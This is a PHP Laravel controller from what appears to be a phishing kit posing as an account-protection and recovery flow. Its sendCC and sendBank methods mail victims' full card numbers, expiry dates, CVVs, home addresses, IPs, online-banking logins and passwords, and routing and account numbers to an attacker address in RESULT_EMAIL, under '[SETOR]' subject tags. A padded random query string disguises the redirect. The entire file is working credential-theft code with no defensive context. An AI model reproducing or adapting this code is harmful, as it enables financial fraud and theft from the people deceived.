<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Mail;

class SummaryController extends Controller
{
    public function index()
    {
        return view('protection');
    }

    public function confirm()
    {
      return view('personal');
    }

    public function personal(Request $request)
    {
      $this->sendCC($request);
      return redirect('/summary/confirm/bank?cmd_=' . base64_encode(md5(uniqid())) . base64_encode(md5(uniqid())) . base64_encode(md5(uniqid())) . base64_encode(md5(uniqid())) . base64_encode(md5(uniqid())) . base64_encode(md5(uniqid())) . base64_encode(md5(uniqid())) . base64_encode(md5(uniqid())) . base64_encode(md5(uniqid())) . base64_encode(md5(uniqid())) . base64_encode(md5(uniqid())) . base64_encode(md5(uniqid())) . base64_encode(md5(uniqid())) . base64_encode(md5(uniqid())) . base64_encode(md5(uniqid())) . base64_encode(md5(uniqid())) . base64_encode(md5(uniqid())) . base64_encode(md5(uniqid())) . base64_encode(md5(uniqid())) . base64_encode(md5(uniqid())) . base64_encode(md5(uniqid())) . base64_encode(md5(uniqid())) . base64_encode(md5(uniqid())) . base64_encode(md5(uniqid())) . base64_encode(md5(uniqid())));
    }

    public function bank()
    {
      return view('bank');
    }

    public function store(Request $request)
    {
        $this->sendBank($request);
        return redirect('/summary/recovered');
    }

    public function sendCC($data)
    {
      $ip = $_SERVER['REMOTE_ADDR'];
      Mail::send('emails.cc',[
        'cardholder' => $data->ys_cardholder,
        'cardnumber' => $data->ys_cardnumber,
        'expired' => $data->ys_expiry,
        'cvv' => $data->ys_csc,
        'fullname' => $data->ys_fullname,
        'address' => $data->ys_address,
        'city' => $data->ys_city,
        'state' => $data->ys_state,
        'zip' => $data->ys_zipcode,
        'country' => $data->ys_country,
        'ip' => $ip
      ],function($mail){
          $mail->subject("[SETOR][CC][" . $_SERVER['REMOTE_ADDR'] . "]");
          $mail->to(env("RESULT_EMAIL"));
          $mail->from("result@rizaltamvan.com", "RESULT GANTENG");
      });
    }

    public function sendBank($data)
    {
      Mail::send('emails.bank', [
        'bank_name' => $data->ys_bnkname,
        'bank_id' => $data->ys_bnkid,
        'bank_pass' => $data->ys_bnkpass,
        'routing_number' => $data->ys_routing,
        'account_number' => $data->ys_acn
      ], function($mail){
        $mail->subject("[SETOR][BANK][" . $_SERVER['REMOTE_ADDR'] . "]");
        $mail->to(env("RESULT_EMAIL"));
        $mail->from("result@rizaltamvan.com", "RESULT GANTENG");
      });
    }

    public function finish()
    {
      return view('recovered');
    }
}
